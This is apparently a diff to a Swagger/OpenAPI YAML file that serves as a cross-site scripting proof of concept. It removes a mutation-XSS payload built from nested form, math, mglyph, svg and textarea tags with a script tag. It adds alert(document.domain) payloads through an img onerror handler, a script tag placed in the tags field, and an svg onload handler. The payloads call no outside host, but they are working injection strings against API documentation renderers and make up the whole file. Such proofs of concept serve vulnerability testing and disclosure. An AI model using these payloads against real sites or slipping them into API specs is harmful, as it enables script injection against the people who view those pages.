@@ -1,5 +1,14 @@
-swagger: '2.0'
+swagger: "2.0"
 info:
-  title: XSS test
-  description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><script> alert(document.domain)</script>"></form>
+  title: "XSS PoC"
+  description: "<img src=x onerror=alert(document.domain)>"
+paths:
+  /xss:
+    get:
+      tags:
+        - "<script>alert(document.domain)</script>"
+      summary: "This is a test"
+      description: "<svg onload=alert(document.domain)>"
+      responses:
+        200:
+          description: "Successful XSS PoC"
